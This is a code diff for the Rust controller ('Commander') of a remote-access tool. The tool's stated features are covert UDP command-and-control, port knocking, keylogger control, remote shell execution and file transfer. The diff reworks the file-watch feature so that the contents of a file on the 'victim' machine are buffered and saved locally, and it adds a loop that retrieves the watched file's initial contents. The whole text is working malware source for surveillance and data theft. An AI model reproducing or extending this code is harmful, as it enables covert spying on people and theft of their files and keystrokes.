@@ -5,7 +5,7 @@
 /// - Port knock initiation via port_knkr module
 /// - Covert UDP channel for C2 commands
 /// - Keylogger control, shell execution, file transfer
-/// - File watch with delta streaming (append/truncate)
+/// - File watch with delta streaming
 ///
 /// Compliance: All protocol data in UDP payload only.
 /// UDP header fields are OS-managed; no transport-layer abuse.
@@ -31,7 +31,7 @@ use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
              PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
              PACKET_TYPE_FILE_WATCH,
-             FILE_WATCH_APPEND, FILE_WATCH_TRUNCATE, FILE_WATCH_DELETE,
+             FILE_WATCH_UPDATE, FILE_WATCH_DELETE,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
              CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
 
@@ -59,6 +59,7 @@ pub struct Commander {
     running: Arc<AtomicBool>,
     pending_commands: HashMap<[u8; 16], Instant>,
     keylog_buffer: HashMap<Ipv4Addr, Vec<u8>>,
+    file_watch_buffer: HashMap<Ipv4Addr, Vec<u8>>,
     file_watch_active: bool,
     file_watch_path: Option<String>,
     file_watch_local_path: Option<String>,
@@ -77,6 +78,7 @@ impl Commander {
             running: Arc::new(AtomicBool::new(true)),
             pending_commands: HashMap::new(),
             keylog_buffer: HashMap::new(),
+            file_watch_buffer: HashMap::new(),
             file_watch_active: false,
             file_watch_path: None,
             file_watch_local_path: None,
@@ -349,52 +351,45 @@ impl Commander {
                             }
                         }
                         PACKET_TYPE_FILE_WATCH => {
-                            match header.subtype {
-                                FILE_WATCH_APPEND => {
-                                    if let Some(local_path) = &self.file_watch_local_path {
-                                        let mut file = std::fs::OpenOptions::new()
-                                            .create(true)
-                                            .append(true)
-                                            .open(local_path)
-                                            .unwrap();
-                                        let _ = file.write_all(payload);
-                                        println!("[*] Appended {} bytes", payload.len());
-                                    }
-                                }
-                                FILE_WATCH_TRUNCATE => {
-                                    if let Some(local_path) = &self.file_watch_local_path {
-                                        let _ = std::fs::OpenOptions::new()
-                                            .write(true)
-                                            .truncate(true)
-                                            .open(local_path);
-                                        println!("[*] File truncated");
-                                    }
-                                }
-                                FILE_WATCH_DELETE => {
-                                    println!("[!] File deleted remotely");
-
-                                    if let Some(local_path) = &self.file_watch_local_path {
-                                        if std::path::Path::new(local_path).exists() {
-                                            use std::time::{SystemTime, UNIX_EPOCH};
-
-                                            let timestamp = SystemTime::now()
-                                                .duration_since(UNIX_EPOCH)
-                                                .unwrap()
-                                                .as_secs();
-
-                                            if let Some(filename) = std::path::Path::new(local_path).file_name() {
-                                                let deleted_path = format!(
-                                                    "watched/deleted/{}_{}",
-                                                    filename.to_string_lossy(),
-                                                    timestamp
-                                                );
-                                                let _ = std::fs::rename(local_path, deleted_path);
+                            if let Some(ip) = self.victim_ip {
+                                match header.subtype {
+                                    FILE_WATCH_UPDATE => {
+                                        if header.content_length > 0 {
+                                            self.file_watch_buffer.entry(ip)
+                                                .or_insert_with(Vec::new)
+                                                .extend_from_slice(payload);
+                                        } else {
+                                            if let Some(local_path) = &self.file_watch_local_path {
+                                                if let Some(data) = self.file_watch_buffer.get(&ip) {
+                                                    let _ = std::fs::write(local_path, data);
+                                                    println!("[*] File updated ({} bytes)", data.len());
+                                                }
                                             }
+                                            self.file_watch_buffer.remove(&ip);
                                         }
                                     }
-                                    self.file_watch_active = false;
+                                    FILE_WATCH_DELETE => {
+                                        println!("[!] File deleted remotely");
+                                        if let Some(local_path) = &self.file_watch_local_path {
+                                            if std::path::Path::new(local_path).exists() {
+                                                let timestamp = SystemTime::now()
+                                                    .duration_since(UNIX_EPOCH)
+                                                    .unwrap()
+                                                    .as_secs();
+                                                if let Some(filename) = std::path::Path::new(local_path).file_name() {
+                                                    let deleted_path = format!(
+                                                        "watched/deleted/{}_{}",
+                                                        filename.to_string_lossy(),
+                                                        timestamp
+                                                    );
+                                                    let _ = std::fs::rename(local_path, deleted_path);
+                                                }
+                                            }
+                                        }
+                                        self.file_watch_active = false;
+                                    }
+                                    _ => {}
                                 }
-                                _ => {}
                             }
                         }
                         PACKET_TYPE_HEARTBEAT => {
@@ -605,10 +600,37 @@ impl Commander {
             return;
         }
 
+        println!("[+] Watch request sent. Receiving initial file content...");
+        
+        let mut file_data = Vec::new();
+        let start = Instant::now();
+        
+        while start.elapsed() < Duration::from_secs(30) && self.running.load(Ordering::SeqCst) {
+            self.process_incoming();
+            
+            if let Some(ip) = self.victim_ip {
+                if let Some(data) = self.keylog_buffer.get(&ip) {
+                    if data.len() == 1 && data[0] == 0xFF {
+                        break;
+                    }
+                    file_data.extend_from_slice(data);
+                    self.keylog_buffer.remove(&ip);
+                }
+            }
+            thread::sleep(Duration::from_millis(100));
+        }
+        
+        if !file_data.is_empty() {
+            let _ = std::fs::write(&local_path, &file_data);
+            println!("[+] Initial file saved ({} bytes)", file_data.len());
+        }
+
         self.file_watch_active = true;
         self.file_watch_path = Some(remote_path.clone());
         self.file_watch_local_path = Some(local_path.clone());
         watch_active.store(true, Ordering::SeqCst);
+
+        println!("[*] Monitoring for file changes (Ctrl+C to stop)...");
 
         while self.running.load(Ordering::SeqCst)
             && watch_active.load(Ordering::SeqCst)
